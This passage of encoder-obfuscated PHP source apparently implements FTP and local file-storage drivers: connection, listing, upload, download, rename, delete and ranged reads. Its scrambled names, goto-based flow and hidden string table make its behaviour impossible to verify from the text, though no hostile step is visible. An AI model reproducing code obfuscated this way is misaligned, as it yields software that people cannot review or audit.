$bç›„õ·Øµ[33], $bç›„õ·Øµ[1149] => $bç›„õ·Øµ[33], $bç›„õ·Øµ[1108] => $DÈÃËİÂ‡, $bç›„õ·Øµ[1112] => $EÕ¡…’õ½‚, $bç›„õ·Øµ[1116] => $DœÀµËî›¸, $bç›„õ·Øµ[1150] => $dÀŠæ¶‚Î§, $bç›„õ·Øµ[1151] => $a¦°´½µè , $bç›„õ·Øµ[1152] => $BŞ–¥È›², $bç›„õ·Øµ[1153] => $f¼Ûéùñ, $bç›„õ·Øµ[1154] => $BÒ‹©Ë²°, $bç›„õ·Øµ[179] => $this->getHost()); return $bÍ–é˜©£â; goto EõÀŒ±Ì‘Â; e±º—¥š™: $bç›„õ·Øµ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÈÃËİÂ‡ = $bç›„õ·Øµ[195]; $a¦°´½µè  = $bç›„õ·Øµ[1137]; goto Eæ«°Å–š£; Eæ«°Å–š£: $AÀò†àÙŠÔ = $bç›„õ·Øµ[69]; $BŞ–¥È›² = gmdate($bç›„õ·Øµ[1138]); $eï…áŞ‚˜Ñ = gmdate($bç›„õ·Øµ[703]); goto dº†ÖŠÇĞä; e…½¦çå¢ô: $bŞ½òÙ‡å = hash_hmac($bç›„õ·Øµ[1147], $AÀò†àÙŠÔ, $d·Øá¼†Æ , !0); $A“¼¢ê‘ÓÕ = hash_hmac($bç›„õ·Øµ[1147], $aÚö¼°´„ˆ, $bŞ½òÙ‡å, !0); $BÒ‹©Ë²° = hash_hmac($bç›„õ·Øµ[1147], $DœÀµËî›¸, $A“¼¢ê‘ÓÕ); goto a•Ğ÷ÊñŠ; EõÀŒ±Ì‘Â: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($d®î£ë‰‘Ö) { parent::__construct(); if (count($d®î£ë‰‘Ö) > 0) { $this->_init($d®î£ë‰‘Ö); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($c»§³çãš) { $EƒÀ’ô¨Øò =& $_SERVER[¶ªÕß‚ØÁŸ]; global $config; $this->appCharset = $config[$EƒÀ’ô¨Øò[1155]]; $this->systemCharset = $config[$EƒÀ’ô¨Øò[1156]]; if (isset($c»§³çãš[$EƒÀ’ô¨Øò[1157]]) && $c»§³çãš[$EƒÀ’ô¨Øò[1157]]) { $this->systemCharset = $c»§³çãš[$EƒÀ’ô¨Øò[1157]]; } } public function iconvApp($dŠöÑÙ×à) { return $this->iconvTo($dŠöÑÙ×à, $this->systemCharset, $this->appCharset); } public function iconvSystem($c•‡ äö¬Ù) { return $this->iconvTo($c•‡ äö¬Ù, $this->appCharset, $this->systemCharset); } public function getPathOuter($DÃ¾äº“Œ) { goto BŞÛØã•†Ï; F‡®†ãÈÓÔ: $DÃ¾äº“Œ = KodIO::clear($DÃ¾äº“Œ); $DÃ¾äº“Œ = substr($DÃ¾äº“Œ, strlen($a”Ÿ²™êÖ)); if (empty($this->pathDriver)) { return $DÃ¾äº“Œ; } goto aÜã¬îŠÕ›; BŞÛØã•†Ï: $A‹˜öÜî‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a”Ÿ²™êÖ = $this->iconvApp($this->pathBase); $DÃ¾äº“Œ = $this->iconvApp($DÃ¾äº“Œ); goto BÑ•Ÿã÷Ì‰; aÜã¬îŠÕ›: return $this->pathDriver . $A‹˜öÜî‹[8] . ltrim($DÃ¾äº“Œ, $A‹˜öÜî‹[8]); goto eŒ»¦Ó½¾Ù; BÑ•Ÿã÷Ì‰: if (substr($a”Ÿ²™êÖ, 0, 2) == $A‹˜öÜî‹[1158]) { $a”Ÿ²™êÖ = BASIC_PATH . substr($a”Ÿ²™êÖ, 2); } if (substr($DÃ¾äº“Œ, 0, 2) == $A‹˜öÜî‹[1158]) { $DÃ¾äº“Œ = BASIC_PATH . substr($DÃ¾äº“Œ, 2); } $a”Ÿ²™êÖ = KodIO::clear($a”Ÿ²™êÖ); goto F‡®†ãÈÓÔ; eŒ»¦Ó½¾Ù: } private function _init($D­‰¹š‡ƒÙ = array()) { goto F¶¾‹‰Ë ; D‰¨†õÖ·º: return $fƒ“×Ê˜‹è; goto bÃŞ®×‹ƒ³; F¶¾‹‰Ë : $C®¡¨®ß¿ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!function_exists($C®¡¨®ß¿[1159])) { show_json(LNG($C®¡¨®ß¿[1160]), !1); } $this->charsetReset($D­‰¹š‡ƒÙ); goto E¡¬§¥óÍê; f¥ìòôØˆ˜: $C·‚İƒà¿ = isset($C„ŸÊºÚŸ[$C®¡¨®ß¿[178]]) && $C„ŸÊºÚŸ[$C®¡¨®ß¿[178]] == $C®¡¨®ß¿[1161] ? !0 : !1; $this->scheme = $C·‚İƒà¿ ? $C®¡¨®ß¿[1162] : $C®¡¨®ß¿[1163]; $this->port = isset($C„ŸÊºÚŸ[$C®¡¨®ß¿[180]]) ? $C„ŸÊºÚŸ[$C®¡¨®ß¿[180]] : 21; goto e¿ÇÙŠîÇğ; d¢“»ÊŞã‚: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $B“¶Æ‰Ö’À[$cå‰¾Û¢‰œ] = array($C®¡¨®ß¿[1164] => $this->connect, $C®¡¨®ß¿[179] => $this->host, $C®¡¨®ß¿[178] => $this->scheme, $C®¡¨®ß¿[180] => $this->port); goto D‰¨†õÖ·º; e¿ÇÙŠîÇğ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $fƒ“×Ê˜‹è = @ftp_login($this->connect, $this->username, $this->userpass); goto d¢“»ÊŞã‚; F£ÂæŒˆ¦Ş: if (isset($B“¶Æ‰Ö’À[$cå‰¾Û¢‰œ])) { foreach ($B“¶Æ‰Ö’À[$cå‰¾Û¢‰œ] as $d³ÂŸÊ»ŒÇ => $C÷®ÑÍ÷‚©) { $this->{$d³ÂŸÊ»ŒÇ} = $C÷®ÑÍ÷‚©; } return !0; } $C„ŸÊºÚŸ = parse_url(trim($this->server, $C®¡¨®ß¿[8])); $this->host = $C„ŸÊºÚŸ[$C®¡¨®ß¿[179]]; goto f¥ìòôØˆ˜; E¡¬§¥óÍê: foreach ($D­‰¹š‡ƒÙ as $d³ÂŸÊ»ŒÇ => $C÷®ÑÍ÷‚©) { if (isset($this->{$d³ÂŸÊ»ŒÇ})) { $this->{$d³ÂŸÊ»ŒÇ} = $C÷®ÑÍ÷‚©; } } static $B“¶Æ‰Ö’À = array(); $cå‰¾Û¢‰œ = md5(json_encode($D­‰¹š‡ƒÙ)); goto F£ÂæŒˆ¦Ş; bÃŞ®×‹ƒ³: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Eêª„¹ŠÂè, $BÉ‹¼â¬ô = '', $e‹¸£ğœ–© = REPEAT_RENAME) { if ($this->setContent($Eêª„¹ŠÂè, $BÉ‹¼â¬ô)) { return $this->getPathOuter($Eêª„¹ŠÂè); } return !1; } public function mkdir($A¾‡áé²¿ˆ, $eãäÖÆÄáÌ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A¾‡áé²¿ˆ = $this->iconvSystem($A¾‡áé²¿ˆ); if ($this->isFolder($A¾‡áé²¿ˆ) || @ftp_mkdir($this->connect, $A¾‡áé²¿ˆ)) { return $this->getPathOuter($A¾‡áé²¿ˆ); } if (!$this->mkdir($this->pathFather($A¾‡áé²¿ˆ))) { return !1; } if ($A¾‡áé²¿ˆ = @ftp_mkdir($this->connect, $A¾‡áé²¿ˆ)) { return $this->getPathOuter($A¾‡áé²¿ˆ); } return !1; } public function copyFile($b²”«Øœ£ğ, $F“’ˆÑöÆÇ) { goto bŠââÛ”Ï­; bŠââÛ”Ï­: if (!$this->_isconn()) { return !1; } $A›ˆäßĞÆÎ = $this->pathThis($this->iconvSystem($b²”«Øœ£ğ)); $c‚‡ø¨‰´ê = $this->tempFile($A›ˆäßĞÆÎ); goto D°´š†Õ„¿; AìÛ…Åá‰: $this->tempFileRemve($c‚‡ø¨‰´ê); return $DÊ‡öôßöÙ; goto BˆŠ·‹êŸÍ; D°´š†Õ„¿: $cÏÇ¸ªÊß÷ = $this->iconvApp($c‚‡ø¨‰´ê); $this->download($b²”«Øœ£ğ, $cÏÇ¸ªÊß÷); $DÊ‡öôßöÙ = $this->upload($F“’ˆÑöÆÇ, $cÏÇ¸ªÊß÷); goto AìÛ…Åá‰; BˆŠ·‹êŸÍ: } public function moveFile($dÒ‡èº†£Ñ, $aÂÔÁùŸ¢) { if (!$this->_isconn()) { return !1; } $dÒ‡èº†£Ñ = $this->iconvSystem($dÒ‡èº†£Ñ); $aÂÔÁùŸ¢ = $this->iconvSystem($aÂÔÁùŸ¢); $fŠÖä°î¨· = @ftp_rename($this->connect, $dÒ‡èº†£Ñ, $aÂÔÁùŸ¢); return $fŠÖä°î¨· ? $this->getPathOuter($aÂÔÁùŸ¢) : !1; } public function delFile($eŸÂáÓãôƒ) { if (!$this->_isconn()) { return !1; } $eŸÂáÓãôƒ = $this->iconvSystem($eŸÂáÓãôƒ); return @ftp_delete($this->connect, $eŸÂáÓãôƒ); } public function delFolder($eÂÜ»ƒâË¨) { if (!$this->_isconn()) { return !1; } $eÂÜ»ƒâË¨ = $this->iconvSystem($eÂÜ»ƒâË¨); $FÑÛ¥¸åî = $this->ftpList($eÂÜ»ƒâË¨); if (!$FÑÛ¥¸åî) { return @ftp_rmdir($this->connect, $eÂÜ»ƒâË¨); } foreach ($FÑÛ¥¸åî as $F­ç˜àª‡) { if ($this->isFolder($F­ç˜àª‡)) { $F­ç˜àª‡ = $this->iconvApp($F­ç˜àª‡); $this->delFolder($F­ç˜àª‡); } else { @ftp_delete($this->connect, $F­ç˜àª‡); } } return @ftp_rmdir($this->connect, $eÂÜ»ƒâË¨); } public function rename($dëÙÍË´…œ, $cöÉºÄîĞ) { goto bë˜®¸¿Î; E…œË’ó³—: $F³ÚÒ‹µÎ = rtrim($C„êåãŞ½ó, $dİ”´µ¹£¢[8]) . $dİ”´µ¹£¢[8] . $FÌ¥¾æš§; $Eß¤Æ„ì¥ = @ftp_rename($this->connect, $dëÙÍË´…œ, $F³ÚÒ‹µÎ); $F³ÚÒ‹µÎ = $this->iconvApp($F³ÚÒ‹µÎ); goto F¾´„Á—Šç; bë˜®¸¿Î: $dİ”´µ¹£¢ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->_isconn()) { return !1; } $FÌ¥¾æš§ = $this->fileNameAuto($this->pathFather($dëÙÍË´…œ), $cöÉºÄîĞ); goto e¨¨ÜİÁì; F¾´„Á—Šç: return $Eß¤Æ„ì¥ ? $this->getPathOuter($F³ÚÒ‹µÎ) : !1; goto AĞ‘„¦…÷è; e¨¨ÜİÁì: $FÌ¥¾æš§ = $this->iconvSystem($FÌ¥¾æš§); $dëÙÍË´…œ = $this->iconvSystem($dëÙÍË´…œ); $C„êåãŞ½ó = $this->pathFather($dëÙÍË´…œ); goto E…œË’ó³—; AĞ‘„¦…÷è: } private function folderInfo($Aé„‚Ç…†¼, $c…“ÄõÒ‡™ = false) { goto EâĞ‡è½è; EâĞ‡è½è: $d±£ŠÆ¬§ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B„†¦ÇÊø§ = $this->getPathOuter(rtrim($Aé„‚Ç…†¼, $d±£ŠÆ¬§[8])); $dæĞ¹†òÔ = $this->pathThis($B„†¦ÇÊø§); goto Bñ­«œ¶Ù; Bñ­«œ¶Ù: $Eê—åî¾¿Í = $this->iconvSystem($Aé„‚Ç…†¼); if ($c…“ÄõÒ‡™) { return array($d±£ŠÆ¬§[28] => $dæĞ¹†òÔ, $d±£ŠÆ¬§[85] => $B„†¦ÇÊø§, $d±£ŠÆ¬§[29] => $d±£ŠÆ¬§[86]); } $f´Ñ¬ÅÙÖ‚ = array($d±£ŠÆ¬§[28] => $dæĞ¹†òÔ, $d±£ŠÆ¬§[85] => $B„†¦ÇÊø§, $d±£ŠÆ¬§[29] => $d±£ŠÆ¬§[86], $d±£ŠÆ¬§[197] => 0, $d±£ŠÆ¬§[117] => 0, $d±£ŠÆ¬§[1165] => !0, $d±£ŠÆ¬§[1166] => !0); goto dÌêš°êÆÏ; dÌêš°êÆÏ: return $f´Ñ¬ÅÙÖ‚; goto Bñ­æºõƒ×; Bñ­æºõƒ×: } private function fileInfo($d‚ª¶ƒŞó, $a¼ãŒ‹ ã = false) { goto b¬ÈÖé‡…; b¬ÈÖé‡…: $d²„•ØÍö† =& $_SERVER[¶ªÕß‚ØÁŸ]; $eĞâÔİëã„ = $this->getPathOuter(rtrim($d‚ª¶ƒŞó, $d²„•ØÍö†[8])); $E†­Í®éºÓ = $this->pathThis($eĞâÔİëã„); goto C©×˜£‰ò‘; dè‡²¾¡Òæ: $fÒ¯·ğùù[$d²„•ØÍö†[117]] = $fÒ¯·ğùù[$d²„•ØÍö†[117]] > 0 ? $fÒ¯·ğùù[$d²„•ØÍö†[117]] : 0; return $fÒ¯·ğùù; goto f†Ôª÷Õ; C©×˜£‰ò‘: $d¿™Š‡ÙÆ = $this->iconvSystem($d‚ª¶ƒŞó); if ($a¼ãŒ‹ ã) { return array($d²„•ØÍö†[28] => $E†­Í®éºÓ, $d²„•ØÍö†[85] => $eĞâÔİëã„, $d²„•ØÍö†[29] => $d²„•ØÍö†[177], $d²„•ØÍö†[170] => $this->ext($d‚ª¶ƒŞó), $d²„•ØÍö†[87] => $this->size($d‚ª¶ƒŞó)); } $fÒ¯·ğùù = array($d²„•ØÍö†[28] => $E†­Í®éºÓ, $d²„•ØÍö†[85] => $eĞâÔİëã„, $d²„•ØÍö†[29] => $d²„•ØÍö†[177], $d²„•ØÍö†[197] => 0, $d²„•ØÍö†[117] => @ftp_mdtm($this->connect, $d¿™Š‡ÙÆ), $d²„•ØÍö†[170] => $this->ext($d‚ª¶ƒŞó), $d²„•ØÍö†[87] => $this->size($d‚ª¶ƒŞó), $d²„•ØÍö†[1165] => !0, $d²„•ØÍö†[1166] => !0); goto dè‡²¾¡Òæ; f†Ôª÷Õ: } public function size($BğğÍáêğ÷) { $aî£à‡¾¡Ù = $this->objectMeta($BğğÍáêğ÷); return $aî£à‡¾¡Ù ? $aî£à‡¾¡Ù[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function info($DÍ–ğ“›Êò) { if ($this->isFile($DÍ–ğ“›Êò)) { return $this->fileInfo($DÍ–ğ“›Êò, 0); } else { if ($this->isFolder($DÍ–ğ“›Êò)) { return $this->folderInfo($DÍ–ğ“›Êò); } } return !1; } public function exist($Aœ„×ƒ¯õ¦) { return $this->objectMeta($Aœ„×ƒ¯õ¦) ? !0 : !1; } public function isFile($AášÅ„ŸÄ) { $d®¶…‚ğä— =& $_SERVER[¶ªÕß‚ØÁŸ]; $câËÇ’Š×¤ = $this->objectMeta($AášÅ„ŸÄ); return $câËÇ’Š×¤ ? $câËÇ’Š×¤[$d®¶…‚ğä—[29]] == $d®¶…‚ğä—[177] : !1; } public function isFolder($D´†ˆàÊ´ã) { $B’‚Ò‰áí =& $_SERVER[¶ªÕß‚ØÁŸ]; $cçÑù–§ = $this->objectMeta($D´†ˆàÊ´ã); return $cçÑù–§ ? $cçÑù–§[$B’‚Ò‰áí[29]] == $B’‚Ò‰áí[86] : !1; } public function listPath($FìÄãÉĞƒã, $B‹Ù”Åñ¡Ó = false) { goto aéÉ”µÀ¹®; aéÉ”µÀ¹®: $BîÌÅÙ¨ë =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->_isconn()) { return !1; } $FìÄãÉĞƒã = $this->iconvSystem($FìÄãÉĞƒã); goto d—ô‘ºÂÎ; d—ô‘ºÂÎ: $F° õ˜‹¸— = $this->ftpList($FìÄãÉĞƒã); $fÑÈ¢ß‚˜‡ = array($BîÌÅÙ¨ë[84] => array(), $BîÌÅÙ¨ë[83] => array()); if (!$F° õ˜‹¸—) { return $fÑÈ¢ß‚˜‡; } goto cŠÕŞ‚ÓÈ; cŠÕŞ‚ÓÈ: foreach ($F° õ˜‹¸— as $FìÄãÉĞƒã) { if ($this->isFolder($FìÄãÉĞƒã)) { $fÑÈ¢ß‚˜‡[$BîÌÅÙ¨ë[84]][] = $this->folderInfo($FìÄãÉĞƒã, $B‹Ù”Åñ¡Ó); } else { $fÑÈ¢ß‚˜‡[$BîÌÅÙ¨ë[83]][] = $this->fileInfo($FìÄãÉĞƒã, $B‹Ù”Åñ¡Ó); } } return $fÑÈ¢ß‚˜‡; goto Cã¹æĞ±®‹; Cã¹æĞ±®‹: } public function has($C®°ÈèÄÀù, $cô•„°¾„Á = false, $B‰é‰¹›º  = true) { goto bšÀ‰¨·; D†Ï¸£÷Ç: $C¬ÏŠ”Ñ¹¯ = $this->ftpList($C®°ÈèÄÀù); if (!$C¬ÏŠ”Ñ¹¯) { return !1; } if ($cô•„°¾„Á) { return array($aÆ‘¤¬ËÕÚ[201] => 0, $aÆ‘¤¬ËÕÚ[202] => count($C¬ÏŠ”Ñ¹¯)); } goto c„À¯Ûó; c„À¯Ûó: foreach ($C¬ÏŠ”Ñ¹¯ as $C®°ÈèÄÀù) { if ($B‰é‰¹›º ) { if (!$this->isFolder($C®°ÈèÄÀù)) { return !0; } } else { if ($this->isFolder($C®°ÈèÄÀù)) { return !0; } } } return !1; goto dÍÑğŞùÖ÷; bšÀ‰¨·: $aÆ‘¤¬ËÕÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->_isconn()) { return !1; } $C®°ÈèÄÀù = $this->iconvSystem($C®°ÈèÄÀù); goto D†Ï¸£÷Ç; dÍÑğŞùÖ÷: } public function listAll($e¸Ññ„‚‹) { goto dõ”É—¸‹­; aİøÚ²ÉÖ: foreach ($E…‹·ö‡Èê[$FÍ‰ğõßã[84]] as $D Ì˜›ÉÒŠ) { $DÂ•†™è†°[] = array($FÍ‰ğõßã[85] => $FÍ‰ğõßã[8] . trim(str_replace($e¸Ññ„‚‹, $FÍ‰ğõßã[33], $D Ì˜›ÉÒŠ), $FÍ‰ğõßã[8]) . $FÍ‰ğõßã[8], $FÍ‰ğõßã[86] => 1, $FÍ‰ğõßã[87] => 0); } foreach ($E…‹·ö‡Èê[$FÍ‰ğõßã[83]] as $B«ÍÀÚŸõ) { $DÂ•†™è†°[] = array($FÍ‰ğõßã[85] => $FÍ‰ğõßã[8] . trim(str_replace($e¸Ññ„‚‹, $FÍ‰ğõßã[33], $B«ÍÀÚŸõ), $FÍ‰ğõßã[8]), $FÍ‰ğõßã[86] => 0, $FÍ‰ğõßã[87] => $this->size($B«ÍÀÚŸõ)); } return $DÂ•†™è†°; goto b‘áÈÇ´¼; B ´Ò®¥Èõ: $E…‹·ö‡Èê = array($FÍ‰ğõßã[83] => array(), $FÍ‰ğõßã[84] => array()); $this->recursionFtpFiles($e¸Ññ„‚‹, $E…‹·ö‡Èê); $DÂ•†™è†° = array(); goto aİøÚ²ÉÖ; dõ”É—¸‹­: $FÍ‰ğõßã =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->_isconn()) { return !1; } $e¸Ññ„‚‹ = $this->iconvSystem($e¸Ññ„‚‹); goto B ´Ò®¥Èõ; b‘áÈÇ´¼: } public function getContent($e›õ­Ë‰) { if (!$this->_isconn()) { return !1; } $e›õ­Ë‰ = $this->iconvSystem($e›õ­Ë‰); return $this->fileSubstr($e›õ­Ë‰); } public function setContent($bÌñÒÃÔïç, $DÊëÇï­ø = '') { goto D÷ÌáŸ‰Âº; dª¨¤“¤‰…: return $Eì¶Ñ•¾×; goto D‘³ª…ŞÀÄ; D÷ÌáŸ‰Âº: if (!$this->_isconn()) { return !1; } $E”àˆàŞ±Â = $this->pathThis($this->iconvSystem($bÌñÒÃÔïç)); $eŒ‡Ëøí„ˆ = $this->tempFile($E”àˆàŞ±Â); goto EŠÏ¢Í§Åš; EŠÏ¢Í§Åš: file_put_contents($eŒ‡Ëøí„ˆ, $DÊëÇï­ø); $Eì¶Ñ•¾× = $this->upload($bÌñÒÃÔïç, $this->iconvApp($eŒ‡Ëøí„ˆ)); $this->tempFileRemve($eŒ‡Ëøí„ˆ); goto dª¨¤“¤‰…; D‘³ª…ŞÀÄ: } public function fileSubstr($b¤›åÓêã°, $A”¢ĞˆÓ£¥ = 0, $C‚‚£ãĞ â = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b¤›åÓêã°, $A”¢ĞˆÓ£¥, $C‚‚£ãĞ â); } private function ftpRequest($A…¢‰ÂÓ¨‰, $BÏÏ¶òÉ½Ä = 0, $cÀ‹ó¼ƒ‰Ç = false) { goto E…ÄÒ¹Îñ«; Eñèä¡áà®: return $D£¥¸‰İåƒ; goto DÍ©‡ÕÏ±¯; EÎÁå™ÁÙ: curl_setopt($B¹ÈÂÂè…, CURLOPT_RETURNTRANSFER, 1); $D£¥¸‰İåƒ = curl_exec($B¹ÈÂÂè…); curl_close($B¹ÈÂÂè…); goto Eñèä¡áà®; E…ÄÒ¹Îñ«: $A…¢‰ÂÓ¨‰ = $this->iconvSystem($A…¢‰ÂÓ¨‰); $føÓ±™ó¦è = $this->scheme . $this->host . $_SERVER[¶ªÕß‚ØÁŸ][4] . $this->port; $B¹ÈÂÂè… = curl_init(); goto eƒêªšßäø; eƒêªšßäø: curl_setopt($B¹ÈÂÂè…, CURLOPT_URL, $føÓ±™ó¦è . $this->pathEncode($A…¢‰ÂÓ¨‰)); curl_setopt($B¹ÈÂÂè…, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($cÀ‹ó¼ƒ‰Ç) { $a§¸—›¹Ÿğ = $BÏÏ¶òÉ½Ä + $cÀ‹ó¼ƒ‰Ç - 1; curl_setopt($B¹ÈÂÂè…, CURLOPT_RANGE, "{$BÏÏ¶òÉ½Ä}\x2d{$a§¸—›¹Ÿğ}"); } goto EÎÁå™ÁÙ; DÍ©‡ÕÏ±¯: } public function upload($FèŞáÁª, $fóìÂø¢À, $eâ¨ÍÌ¦¥Õ = false, $Cº‘ä¡Œ = REPEAT_REPLACE) { goto BÁ­±Ãªê‡; BÁ­±Ãªê‡: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FèŞáÁª))) { return !1; } $FèŞáÁª = $this->iconvSystem($FèŞáÁª); goto F‘‹—ÔÅŒÅ; B¯ä¡Õƒ‡Œ: if ($c‘êø¨±õÒ != FTP_FINISHED) { return !1; } return $this->getPathOuter($FèŞáÁª); goto FºÂâº±¦; F‘‹—ÔÅŒÅ: $fóìÂø¢À = $this->iconvSystem($fóìÂø¢À); $c‘êø¨±õÒ = ftp_nb_put($this->connect, $FèŞáÁª, $fóìÂø¢À, FTP_BINARY); while ($c‘êø¨±õÒ == FTP_MOREDATA) { $c‘êø¨±õÒ = ftp_nb_continue($this->connect); } goto B¯ä¡Õƒ‡Œ; FºÂâº±¦: } public function download($Aè°³ô£¿, $d‹´™´¹º‘ = '') { goto fİŠÀ­ìê™; bÆŸ‚ÍÇ¨ë: $Aè°³ô£¿ = $this->iconvSystem($Aè°³ô£¿); $d‹´™´¹º‘ = $this->iconvSystem($d‹´™´¹º‘); $b³ÍÛË¿«® = ftp_nb_get($this->connect, $d‹´™´¹º‘, $Aè°³ô£¿, FTP_BINARY); goto fõèîŒÓÚÏ; fİŠÀ­ìê™: if (!$this->_isconn()) { return !1; } $E†Í–éƒÍ… = $this->pathFather($d‹´™´¹º‘); if (!IO::mkdir($E†Í–éƒÍ…)) { return !1; } goto bÆŸ‚ÍÇ¨ë; fõèîŒÓÚÏ: while ($b³ÍÛË¿«® == FTP_MOREDATA) { $b³ÍÛË¿«® = ftp_nb_continue($this->connect); } if ($b³ÍÛË¿«® != FTP_FINISHED) { return !1; } return $this->iconvApp($d‹´™´¹º‘); goto f² ùÇªµ„; f² ùÇªµ„: } private function ftpList($fÇË©Àß®) { goto EËéšçñ×; EËéšçñ×: $D‰¡‚±Çã =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->isFolder($fÇË©Àß®)) { return !1; } @ftp_chdir($this->connect, $D‰¡‚±Çã[8]); goto FĞù‡†®¿º; FĞù‡†®¿º: $fÇË©Àß® = rtrim($fÇË©Àß®, $D‰¡‚±Çã[8]) . $D‰¡‚±Çã[8]; $a¨ ´ñæ‡ = @ftp_nlist($this->connect, $fÇË©Àß®); if ($a¨ ´ñæ‡ === !1) { $a¨ ´ñæ‡ = @ftp_rawlist($this->connect, $fÇË©Àß®); foreach ($a¨ ´ñæ‡ as $BÒ˜·à¸· => $AÁºœÚÅß) { $a¨ ´ñæ‡[$BÒ˜·à¸·] = end(explode($D‰¡‚±Çã[1167], $AÁºœÚÅß)); } } goto E„Ê¦ÖÍâƒ; E„Ê¦ÖÍâƒ: $cÙµÏ§‰ê = array(); foreach ($a¨ ´ñæ‡ as $f¨¶ùÍÎ·) { if ($f¨¶ùÍÎ· == $D‰¡‚±Çã[101] || $f¨¶ùÍÎ· == $D‰¡‚±Çã[1168]) { continue; } if (!strstr($f¨¶ùÍÎ·, $D‰¡‚±Çã[8])) { $f¨¶ùÍÎ· = $fÇË©Àß® . ltrim($f¨¶ùÍÎ·, $D‰¡‚±Çã[8]); } $cÙµÏ§‰ê[] = $this->iconvApp($f¨¶ùÍÎ·); } return $cÙµÏ§‰ê; goto F À‘½Ìß; F À‘½Ìß: } private function recursionFtpFiles($dÙ­äÏ‰¯‰, &$B¡Éöµ«Øğ) { $b÷ÒëŒâÈ¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->_isconn()) { return !1; } if (!($e—­§­‹¤† = $this->ftpList($dÙ­äÏ‰¯‰))) { return !1; } foreach ($e—­§­‹¤† as $dÙ­äÏ‰¯‰) { if ($this->isFolder($dÙ­äÏ‰¯‰)) { $this->recursionFtpFiles($dÙ­äÏ‰¯‰, $B¡Éöµ«Øğ); $B¡Éöµ«Øğ[$b÷ÒëŒâÈ¬[84]][] = $dÙ­äÏ‰¯‰; } else { $B¡Éöµ«Øğ[$b÷ÒëŒâÈ¬[83]][] = $dÙ­äÏ‰¯‰; } } } private function objectMeta($bª‡çã¥Î) { goto fî¥‹·ø¥©; E­ç§ø¿Ë“: return $B²êËæîô´; goto CÊ÷õÓ†¬; C¬½Œê¬’Å: if ($B²êËæîô´ !== null && $B²êËæîô´ !== !1) { return $B²êËæîô´; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $AÄ­«‰İâ[8]); goto Cë•Ü®¨Ê£; fî¥‹·ø¥©: $AÄ­«‰İâ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÒÄßô¹Ô = $AÄ­«‰İâ[1169] . md5($bª‡çã¥Î); $B²êËæîô´ = Cache::get($BÒÄßô¹Ô); goto C¬½Œê¬’Å; Cë•Ü®¨Ê£: $b¾£íŞš• = @ftp_size($this->connect, $this->iconvSystem($bª‡çã¥Î)); if ($b¾£íŞš• != -1) { $B²êËæîô´ = array($AÄ­«‰İâ[87] => $b¾£íŞš•, $AÄ­«‰İâ[29] => $AÄ­«‰İâ[177]); } else { $AåÎÄ‚ë• = @ftp_chdir($this->connect, $this->iconvSystem($bª‡çã¥Î)); $B²êËæîô´ = $AåÎÄ‚ë• ? array($AÄ­«‰İâ[87] => 0, $AÄ­«‰İâ[29] => $AÄ­«‰İâ[86]) : !1; } Cache::set($BÒÄßô¹Ô, $B²êËæîô´, 0); goto E­ç§ø¿Ë“; CÊ÷õÓ†¬: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fã¤ÚŸœ¯¾) { if (substr($fã¤ÚŸœ¯¾, 0, 2) == $_SERVER[¶ªÕß‚ØÁŸ][1158]) { $fã¤ÚŸœ¯¾ = BASIC_PATH . substr($fã¤ÚŸœ¯¾, 2); } return $fã¤ÚŸœ¯¾; } public function iconvApp($D²Û³Å ›) { $B‘ñŸæÁ’Ò =& $_SERVER[¶ªÕß‚ØÁŸ]; global $config; return $this->iconvTo($D²Û³Å ›, $config[$B‘ñŸæÁ’Ò[1156]], $config[$B‘ñŸæÁ’Ò[1155]]); } public function iconvSystem($B¥ÔŞøÁ•ø) { $DÄÍ™ÕåÍ¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; global $config; return $this->iconvTo($B¥ÔŞøÁ•ø, $config[$DÄÍ™ÕåÍ¹[1155]], $config[$DÄÍ™ÕåÍ¹[1156]]); } public function getPathOuter($a’•«ÃÅŞŸ) { goto cíñ‰œ÷ëÅ; DŞï£´ ¡™: if (substr($a²Ø´¨³, 0, 2) == $D¡õå–£«[1158]) { $a²Ø´¨³ = BASIC_PATH . substr($a²Ø´¨³, 2); } if (substr($a’•«ÃÅŞŸ, 0, 2) == $D¡õå–£«[1158]) { $a’•«ÃÅŞŸ = BASIC_PATH . substr($a’•«ÃÅŞŸ, 2); } $a²Ø´¨³ = KodIO::clear($a²Ø´¨³); goto b½¯Û¡«×Ç; cíñ‰œ÷ëÅ: $D¡õå–£« =& $_SERVER[¶ªÕß‚ØÁŸ]; $a²Ø´¨³ = $this->iconvApp($this->pathBase); $a’•«ÃÅŞŸ = $this->iconvApp($a’•«ÃÅŞŸ); goto DŞï£´ ¡™; DØ‰İ”ø: return $this->pathDriver . $D¡õå–£«[8] . ltrim($a’•«ÃÅŞŸ, $D¡õå–£«[8]); goto eÂ¦¤²Â‡‡; b½¯Û¡«×Ç: $a’•«ÃÅŞŸ = KodIO::clear($a’•«ÃÅŞŸ); $a’•«ÃÅŞŸ = substr($a’•«ÃÅŞŸ, strlen($a²Ø´¨³)); if (empty($this->pathDriver)) { return $a’•«ÃÅŞŸ; } goto DØ‰İ”ø; eÂ¦¤²Â‡‡: } 